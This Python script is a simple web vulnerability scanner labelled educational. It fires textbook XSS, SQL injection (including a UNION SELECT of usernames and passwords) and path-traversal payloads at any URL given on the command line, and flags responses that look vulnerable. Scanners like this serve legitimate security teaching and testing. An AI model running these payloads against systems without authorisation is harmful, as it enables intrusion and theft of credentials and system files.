#!/usr/bin/env python3
"""
Sample Exploit Script for Web Attacker Server
This is a demonstration script for educational purposes only.
"""

import requests
import sys
import argparse
from urllib.parse import urljoin

def test_xss(url, payload):
    """Test for XSS vulnerability"""
    print(f"[+] Testing XSS with payload: {payload}")
    
    # Test in URL parameter
    test_url = f"{url}?q={payload}"
    try:
        response = requests.get(test_url, timeout=5)
        if payload in response.text:
            print(f"[!] Potential XSS found in URL parameter: {test_url}")
    except Exception as e:
        print(f"[-] Error testing XSS: {e}")

def test_sqli(url, payload):
    """Test for SQL injection vulnerability"""
    print(f"[+] Testing SQL injection with payload: {payload}")
    
    # Test in search parameter
    data = {'search': payload}
    try:
        response = requests.post(url, data=data, timeout=5)
        if 'error' in response.text.lower() or 'sql' in response.text.lower():
            print(f"[!] Potential SQL injection found: {payload}")
    except Exception as e:
        print(f"[-] Error testing SQL injection: {e}")

def test_lfi(url, payload):
    """Test for Local File Inclusion vulnerability"""
    print(f"[+] Testing LFI with payload: {payload}")
    
    test_url = f"{url}?file={payload}"
    try:
        response = requests.get(test_url, timeout=5)
        if 'root:' in response.text or 'windows' in response.text.lower():
            print(f"[!] Potential LFI found: {test_url}")
    except Exception as e:
        print(f"[-] Error testing LFI: {e}")

def main():
    parser = argparse.ArgumentParser(description='Sample Web Vulnerability Scanner')
    parser.add_argument('url', help='Target URL to test')
    parser.add_argument('--xss', action='store_true', help='Test for XSS vulnerabilities')
    parser.add_argument('--sqli', action='store_true', help='Test for SQL injection vulnerabilities')
    parser.add_argument('--lfi', action='store_true', help='Test for LFI vulnerabilities')
    
    args = parser.parse_args()
    
    print("=" * 50)
    print("Sample Web Vulnerability Scanner")
    print("For educational purposes only!")
    print("=" * 50)
    
    if not any([args.xss, args.sqli, args.lfi]):
        print("[-] Please specify at least one test type (--xss, --sqli, --lfi)")
        sys.exit(1)
    
    # Sample payloads
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')"
    ]
    
    sqli_payloads = [
        "' OR 1=1 --",
        "' UNION SELECT username,password FROM users --",
        "admin'--"
    ]
    
    lfi_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "/etc/passwd"
    ]
    
    if args.xss:
        print("\n[*] Testing XSS vulnerabilities...")
        for payload in xss_payloads:
            test_xss(args.url, payload)
    
    if args.sqli:
        print("\n[*] Testing SQL injection vulnerabilities...")
        for payload in sqli_payloads:
            test_sqli(args.url, payload)
    
    if args.lfi:
        print("\n[*] Testing LFI vulnerabilities...")
        for payload in lfi_payloads:
            test_lfi(args.url, payload)
    
    print("\n[+] Scan completed!")

if __name__ == "__main__":
    main()
